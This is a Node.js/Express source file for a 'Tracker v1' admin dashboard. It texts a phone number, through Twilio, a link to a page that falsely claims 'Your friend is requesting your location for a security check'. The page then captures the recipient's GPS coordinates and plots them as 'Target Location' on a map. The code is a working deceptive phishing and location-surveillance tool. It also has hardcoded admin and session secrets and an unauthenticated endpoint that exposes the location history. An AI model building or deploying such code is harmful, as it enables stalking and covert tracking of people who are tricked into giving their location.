const express = require('express');
const session = require('express-session');
const fs = require('fs');
const twilio = require('twilio');
const app = express();

// --- CONFIGURATION ---
const ADMIN_USER = "admin";
const ADMIN_PASS = "supersecret";
// Railway provides the PORT automatically
const PORT = process.env.PORT || 3000;

// Twilio Credentials (Pulled from Railway Environment Variables)
const TWILIO_SID = process.env.TWILIO_SID; 
const TWILIO_TOKEN = process.env.TWILIO_TOKEN;
const TWILIO_NUM = process.env.TWILIO_NUM; 

let client;
if (TWILIO_SID && TWILIO_TOKEN) {
    client = twilio(TWILIO_SID, TWILIO_TOKEN);
}

const HISTORY_FILE = '/tmp/history.json'; // Railway uses /tmp for temporary file storage
if (!fs.existsSync(HISTORY_FILE)) fs.writeFileSync(HISTORY_FILE, JSON.stringify([]));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({ secret: 'railway-secret-key', resave: false, saveUninitialized: true }));

// --- ROUTES ---

// LOGIN PAGE
app.get('/', (req, res) => {
    res.send(`
        <body style="font-family:sans-serif; background:#121212; color:white; display:flex; justify-content:center; align-items:center; height:100vh; margin:0;">
            <form action="/login" method="POST" style="background:#1e1e1e; padding:40px; border-radius:12px; box-shadow: 0 8px 32px rgba(0,0,0,0.3);">
                <h2 style="margin-top:0;">Secure Tracker Admin</h2>
                <input type="text" name="user" placeholder="Username" required style="display:block; width:100%; margin-bottom:15px; padding:12px; border-radius:5px; border:none;">
                <input type="password" name="pass" placeholder="Password" required style="display:block; width:100%; margin-bottom:20px; padding:12px; border-radius:5px; border:none;">
                <button type="submit" style="width:100%; padding:12px; background:#007bff; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">Enter Dashboard</button>
            </form>
        </body>
    `);
});

app.post('/login', (req, res) => {
    if (req.body.user === ADMIN_USER && req.body.pass === ADMIN_PASS) {
        req.session.loggedIn = true;
        res.redirect('/dashboard');
    } else { res.send("Access Denied. <a href='/'>Retry</a>"); }
});

// DASHBOARD
app.get('/dashboard', (req, res) => {
    if (!req.session.loggedIn) return res.redirect('/');
    res.send(`
        <html>
        <head>
            <title>Admin Dashboard</title>
            <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
            <style>
                body { margin:0; display:flex; font-family:sans-serif; height:100vh; }
                #side { width:320px; background:#1a1a1a; color:white; padding:20px; box-shadow: 2px 0 10px rgba(0,0,0,0.5); z-index:1000; }
                #map { flex:1; }
                input { width:100%; padding:10px; margin-top:10px; border-radius:4px; border:1px solid #333; background:#222; color:white; box-sizing:border-box; }
                button { width:100%; padding:12px; margin-top:15px; background:#28a745; color:white; border:none; border-radius:4px; cursor:pointer; font-weight:bold; }
                .log-box { margin-top:20px; border-top:1px solid #333; padding-top:10px; }
                .log-entry { font-size:12px; background:#252525; padding:8px; margin-bottom:8px; border-radius:4px; border-left:3px solid #28a745; }
            </style>
        </head>
        <body>
            <div id="side">
                <h2 style="color:#28a745;">🛰️ Tracker v1</h2>
                <p style="font-size:13px; color:#888;">Enter a phone number to send a tracking link.</p>
                <input type="text" id="phone" placeholder="+1234567890">
                <button onclick="sendSMS()">Send Link via SMS</button>
                <div class="log-box">
                    <h4>Target History</h4>
                    <div id="history"></div>
                </div>
                <a href="/logout" style="color:#ff4444; text-decoration:none; font-size:13px; display:block; margin-top:20px;">Logout</a>
            </div>
            <div id="map"></div>
            <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
            <script>
                var map = L.map('map').setView([20,0], 2);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                var marker;

                function sendSMS() {
                    const num = document.getElementById('phone').value;
                    if(!num) return alert("Enter a number!");
                    fetch('/send-sms', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ phone: num })
                    }).then(r => r.json()).then(data => alert(data.msg));
                }

                function updateFeed() {
                    fetch('/get-history').then(res => res.json()).then(data => {
                        const h = document.getElementById('history');
                        h.innerHTML = "";
                        data.reverse().slice(0,5).forEach(item => {
                            h.innerHTML += "<div class='log-entry'><b>" + item.phone + "</b><br>" + item.time + "</div>";
                        });
                        if(data[0]) {
                            const last = data[0];
                            if(marker) map.removeLayer(marker);
                            marker = L.marker([last.lat, last.lng]).addTo(map).bindPopup("Target Location").openPopup();
                            map.setView([last.lat, last.lng], 16);
                        }
                    });
                }
                setInterval(updateFeed, 4000);
                updateFeed();
            </script>
        </body>
        </html>
    `);
});

// FRIEND'S SHARE PAGE
app.get('/share', (req, res) => {
    res.send(`
        <body style="text-align:center; padding:40px; font-family:sans-serif; background:#f8f9fa;">
            <div style="max-width:400px; margin:auto; background:white; padding:30px; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
                <h1>📍 Location Check</h1>
                <p>Your friend is requesting your location for a security check. Please click below to confirm.</p>
                <button onclick="share()" style="padding:15px 30px; font-size:18px; background:#007bff; color:white; border:none; border-radius:50px; cursor:pointer; width:100%;">Allow Sharing</button>
            </div>
            <script>
                function share() {
                    navigator.geolocation.getCurrentPosition(p => {
                        fetch('/save-loc', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ lat: p.coords.latitude, lng: p.coords.longitude })
                        }).then(() => {
                            alert("Location sent! You can close this tab.");
                        });
                    }, err => alert("Please enable GPS and try again."));
                }
            </script>
        </body>
    `);
});

// SMS API
app.post('/send-sms', (req, res) => {
    if (!client) return res.json({ msg: "Twilio not configured in Railway Variables!" });
    const protocol = req.headers['x-forwarded-proto'] || 'http';
    const link = protocol + "://" + req.get('host') + "/share";
    client.messages.create({ body: "Please click to share your location: " + link, from: TWILIO_NUM, to: req.body.phone })
        .then(() => res.json({ msg: "SMS Sent Successfully!" }))
        .catch(e => res.json({ msg: "Twilio Error: " + e.message }));
});

app.post('/save-loc', (req, res) => {
    const data = JSON.parse(fs.readFileSync(HISTORY_FILE));
    data.push({ ...req.body, phone: "Active Target", time: new Date().toLocaleString() });
    fs.writeFileSync(HISTORY_FILE, JSON.stringify(data));
    res.sendStatus(200);
});

app.get('/get-history', (req, res) => {
    res.send(fs.readFileSync(HISTORY_FILE));
});

app.get('/logout', (req, res) => { req.session.destroy(); res.redirect('/'); });

// Binds to 0.0.0.0 for Railway
app.listen(PORT, '0.0.0.0', () => console.log('Server Active on Port ' + PORT));